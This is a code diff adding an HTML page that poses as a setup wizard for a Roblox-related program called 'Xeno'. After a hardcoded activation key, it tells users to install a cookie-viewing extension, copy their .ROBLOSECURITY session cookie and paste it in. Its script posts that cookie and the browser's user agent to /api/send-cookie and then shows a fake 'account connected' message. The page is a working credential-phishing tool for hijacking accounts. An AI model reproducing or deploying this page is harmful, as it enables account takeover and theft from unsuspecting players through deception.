@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xeno</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Step 0: Activation Key -->
+        <div class="step active" id="step0">
+            <h1>Welcome to Xeno!</h1>
+            <p class="subtitle">Enter your activation key to continue</p>
+            <div class="input-container">
+                <input type="text" id="activationKey" placeholder="Get your activation key" autocomplete="off">
+            </div>
+            <button class="btn" onclick="checkActivationKey()">Activate</button>
+        </div>
+
+        <!-- Step 1: Countdown -->
+        <div class="step" id="step1">
+            <h2>Correct key!</h2>
+            <p class="subtitle">Please wait 5 seconds</p>
+            <div class="countdown" id="countdown">5</div>
+            <p>Redirecting to language selection...</p>
+        </div>
+
+        <!-- Step 2: Language Selection -->
+        <div class="step" id="step2">
+            <h2>Choose the language</h2>
+            <p class="subtitle">Select your preferred language</p>
+            <div class="flags">
+                <div class="flag flag-ru" onclick="selectLanguage('ru')"></div>
+                <div class="flag flag-gb" onclick="selectLanguage('en')"></div>
+            </div>
+            <p id="languageHint">Click on a flag to select language</p>
+            <button class="btn" onclick="nextStep()">Continue</button>
+        </div>
+
+        <!-- Step 3: Instruction Start -->
+        <div class="step" id="step3">
+            <h2 id="step3Title">Connect the program to your Roblox account</h2>
+            <p class="subtitle" id="step3Subtitle">You need to complete the training</p>
+            <button class="btn" id="startBtn" onclick="nextStep()">Start!</button>
+        </div>
+
+        <!-- Step 4: Instruction 1 -->
+        <div class="step" id="step4">
+            <h3 id="step4Title">Step 1: Registration on Roblox</h3>
+            <div class="instruction-image-placeholder">
+                <img src="1.png" class="instruction-image" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <div class="image-placeholder" style="display: none;">
+                    1.png - Roblox Registration Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step4Text">
+                You need to go to the Roblox website from your PC and register an account. If you already have an account, you can skip this step.
+            </div>
+            <button class="btn btn-small" onclick="nextStep()">Next page</button>
+        </div>
+
+        <!-- Step 5: Instruction 2 -->
+        <div class="step" id="step5">
+            <h3 id="step5Title">Step 2: Install Extension</h3>
+            <div class="instruction-image-placeholder">
+                <img src="2.png" class="instruction-image" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <div class="image-placeholder" style="display: none;">
+                    2.png - Chrome Web Store Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step5Text">
+                Next, go to this <span class="link" onclick="window.open('https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar', '_blank')">website</span> and download this extension. It will allow you to view your Roblox cookies.
+            </div>
+            <button class="btn btn-small" onclick="nextStep()">Next</button>
+        </div>
+
+        <!-- Step 6: Instruction 3 -->
+        <div class="step" id="step6">
+            <h3 id="step6Title">Step 3: Get .ROBLOSECURITY</h3>
+            <div class="instruction-image-placeholder">
+                <img src="3.png" class="instruction-image" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <div class="image-placeholder" style="display: none;">
+                    3.png - EditThisCookie Extension Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step6Text">
+                Then go to the Roblox website and open the extension. Click on .ROBLOSECURITY and copy what is in the "value" field. Paste it here:
+            </div>
+            <div class="input-with-btn">
+                <input type="text" id="robloxCookie" placeholder="Paste .ROBLOSECURITY value here" autocomplete="off">
+                <button class="btn" id="connectBtn" onclick="connectAccount()" disabled>Connect</button>
+            </div>
+            <div id="waitingMessage" class="waiting" style="display: none;">
+                <p id="connectionStatus">Waiting for connection...</p>
+                <p id="connectionTime">Takes about 3 minutes</p>
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // Current language (default: English)
+        let currentLanguage = 'en';
+        let currentStep = 0;
+        let countdownInterval;
+        
+        // Translation dictionary
+        const translations = {
+            'en': {
+                'step3Title': 'Connect the program to your Roblox account',
+                'step3Subtitle': 'You need to complete the training',
+                'startBtn': 'Start!',
+                'step4Title': 'Step 1: Registration on Roblox',
+                'step4Text': 'You need to go to the Roblox website from your PC and register an account. If you already have an account, you can skip this step.',
+                'nextPage': 'Next page',
+                'step5Title': 'Step 2: Install Extension',
+                'step5Text': 'Next, go to this [website] and download this extension. It will allow you to view your Roblox cookies.',
+                'step6Title': 'Step 3: Get .ROBLOSECURITY',
+                'step6Text': 'Then go to the Roblox website and open the extension. Click on .ROBLOSECURITY and copy what is in the "value" field. Paste it here:',
+                'cookiePlaceholder': 'Paste .ROBLOSECURITY value here',
+                'connectBtn': 'Connect',
+                'waiting': 'Waiting for connection...',
+                'timeNote': 'Takes about 3 minutes',
+                'languageHint': 'Click on a flag to select language',
+                'correctKey': 'Correct key!',
+                'redirecting': 'Redirecting to language selection...',
+                'chooseLanguage': 'Choose the language',
+                'selectLanguage': 'Select your preferred language'
+            },
+            'ru': {
+                'step3Title': 'Чтобы подключить программу к вашему Roblox аккаунту нужно пройти обучение',
+                'step3Subtitle': '',
+                'startBtn': 'Начать!',
+                'step4Title': 'Шаг 1: Регистрация в Roblox',
+                'step4Text': 'Вы должны зайти с ПК на сайт roblox.com и зарегистрироваться. Если у вас уже есть аккаунт, можете пропустить этот шаг.',
+                'nextPage': 'Следующая страница',
+                'step5Title': 'Шаг 2: Установка расширения',
+                'step5Text': 'Далее переходите на этот [сайт] и скачайте это расширение. Оно позволит вам просматривать ваши куки от Roblox.',
+                'step6Title': 'Шаг 3: Получение .ROBLOSECURITY',
+                'step6Text': 'Далее зайдите на сайт Roblox и откройте расширение. Нажмите на .ROBLOSECURITY и скопируйте значение из поля "value". Вставьте его сюда:',
+                'cookiePlaceholder': 'Вставьте значение .ROBLOSECURITY сюда',
+                'connectBtn': 'Подключить',
+                'waiting': 'Ожидайте подключение',
+                'timeNote': 'Занимает 3 минуты',
+                'languageHint': 'Нажмите на флаг для выбора языка',
+                'correctKey': 'Правильный ключ!',
+                'redirecting': 'Перенаправление к выбору языка...',
+                'chooseLanguage': 'Выберите язык',
+                'selectLanguage': 'Выберите предпочитаемый язык'
+            }
+        };
+
+        // Initialize language
+        function updateLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Update all text elements
+            document.getElementById('step3Title').textContent = translations[lang]['step3Title'];
+            document.getElementById('step3Subtitle').textContent = translations[lang]['step3Subtitle'];
+            document.getElementById('startBtn').textContent = translations[lang]['startBtn'];
+            document.getElementById('step4Title').textContent = translations[lang]['step4Title'];
+            document.getElementById('step4Text').textContent = translations[lang]['step4Text'];
+            document.querySelector('#step4 button').textContent = translations[lang]['nextPage'];
+            document.getElementById('step5Title').textContent = translations[lang]['step5Title'];
+            document.getElementById('step5Text').innerHTML = translations[lang]['step5Text'].replace('[сайт]', '<span class="link" onclick="window.open(\'https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar\', \'_blank\')">сайт</span>').replace('[website]', '<span class="link" onclick="window.open(\'https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar\', \'_blank\')">website</span>');
+            document.getElementById('step6Title').textContent = translations[lang]['step6Title'];
+            document.getElementById('step6Text').textContent = translations[lang]['step6Text'];
+            document.getElementById('robloxCookie').placeholder = translations[lang]['cookiePlaceholder'];
+            document.getElementById('connectBtn').textContent = translations[lang]['connectBtn'];
+            
+            if (document.getElementById('connectionStatus')) {
+                document.getElementById('connectionStatus').textContent = translations[lang]['waiting'];
+                document.getElementById('connectionTime').textContent = translations[lang]['timeNote'];
+            }
+            
+            document.getElementById('languageHint').textContent = translations[lang]['languageHint'];
+            
+            // Update step 1
+            if (document.getElementById('countdown').previousElementSibling) {
+                document.getElementById('countdown').previousElementSibling.textContent = translations[lang]['correctKey'];
+            }
+            
+            // Update step 2
+            document.querySelector('#step2 h2').textContent = translations[lang]['chooseLanguage'];
+            document.querySelector('#step2 .subtitle').textContent = translations[lang]['selectLanguage'];
+        }
+
+        // Language selection
+        function selectLanguage(lang) {
+            // Update UI
+            document.querySelectorAll('.flag').forEach(flag => {
+                flag.classList.remove('selected');
+            });
+            
+            if (lang === 'ru') {
+                document.querySelector('.flag-ru').classList.add('selected');
+            } else {
+                document.querySelector('.flag-gb').classList.add('selected');
+            }
+            
+            // Update language
+            updateLanguage(lang);
+        }
+
+        // Check activation key
+        function checkActivationKey() {
+            const key = document.getElementById('activationKey').value.trim();
+            if (key === 'DA4FFSE') {
+                // Show success
+                showStep(1);
+                
+                // Start countdown
+                let seconds = 5;
+                const countdownEl = document.getElementById('countdown');
+                countdownEl.textContent = seconds;
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownEl.textContent = seconds;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        showStep(2);
+                    }
+                }, 1000);
+            } else {
+                alert('Invalid activation key!');
+            }
+        }
+
+        // Show specific step
+        function showStep(stepNumber) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Show the requested step
+            document.getElementById(`step${stepNumber}`).classList.add('active');
+            currentStep = stepNumber;
+            
+            // Enable connect button when cookie input changes
+            if (stepNumber === 6) {
+                document.getElementById('robloxCookie').addEventListener('input', function() {
+                    document.getElementById('connectBtn').disabled = this.value.trim() === '';
+                });
+            }
+        }
+
+        // Next step
+        function nextStep() {
+            if (currentStep < 6) {
+                showStep(currentStep + 1);
+            }
+        }
+
+        // Connect account function
+        async function connectAccount() {
+            const cookieValue = document.getElementById('robloxCookie').value.trim();
+            
+            if (!cookieValue) {
+                alert('Please enter the .ROBLOSECURITY value');
+                return;
+            }
+            
+            // Show waiting message
+            document.getElementById('waitingMessage').style.display = 'block';
+            document.getElementById('connectBtn').disabled = true;
+            
+            try {
+                // Send to backend
+                const response = await fetch('/api/send-cookie', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cookieValue: cookieValue,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showNotification('✅ Данные отправлены успешно! Ожидайте подключения...', 'success');
+                    
+                    // Simulate connection process (3 minutes)
+                    setTimeout(() => {
+                        showNotification('✅ Аккаунт успешно подключен!', 'success');
+                        document.getElementById('connectionStatus').textContent = 
+                            currentLanguage === 'ru' ? '✅ Аккаунт подключен!' : '✅ Account connected!';
+                        document.getElementById('connectionTime').textContent = 
+                            currentLanguage === 'ru' ? '✅ Завершено!' : '✅ Completed!';
+                    }, 3000);
+                } else {
+                    throw new Error(data.message);
+                }
+            } catch (error) {
+                console.error('Connection error:', error);
+                showNotification('❌ Ошибка подключения. Попробуйте еще раз.', 'error');
+                document.getElementById('connectBtn').disabled = false;
+                document.getElementById('waitingMessage').style.display = 'none';
+            }
+        }
+
+        // Show notification
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            
+            if (type === 'success') {
+                notification.style.background = 'linear-gradient(45deg, #00cc33, #009900)';
+            } else {
+                notification.style.background = 'linear-gradient(45deg, #ff3366, #cc0033)';
+            }
+            
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set default language to English
+            selectLanguage('en');
+            
+            // Allow activation with Enter key
+            document.getElementById('activationKey').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkActivationKey();
+                }
+            });
+            
+            // Allow cookie input with Enter key
+            document.getElementById('robloxCookie').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && !document.getElementById('connectBtn').disabled) {
+                    connectAccount();
+                }
+            });
+            
+            // Auto-focus on activation input
+            document.getElementById('activationKey').focus();
+        });
+    </script>
+</body>
+</html>
